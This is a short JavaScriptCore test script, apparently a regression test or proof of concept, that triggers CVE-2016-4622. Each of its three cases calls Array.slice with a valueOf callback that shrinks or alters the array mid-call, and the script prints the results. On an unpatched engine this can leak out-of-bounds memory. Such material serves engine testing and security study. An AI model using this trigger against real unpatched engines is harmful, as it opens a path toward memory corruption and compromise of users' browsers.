// jsc: CVE-2016-4622 (Phrack 70 "Attacking JavaScript Engines") array-reentrancy
var a = [];
for (var i = 0; i < 100; i++) a.push(i + 0.123);
var b = a.slice(0, { valueOf() { a.length = 0; return 10; } });
print(b.length, b[0], b[9], 3 in b);
var c = [1, 2, 3, 4, 5, 6, 7, 8];
print(c.slice({ valueOf() { c.length = 2; return 1; } }, 6).join());
var d = [1.5, 2.5, 3.5, 4.5];
print(String(d.slice(0, { valueOf() { d[0] = {}; d.length = 1; return 4; } })));
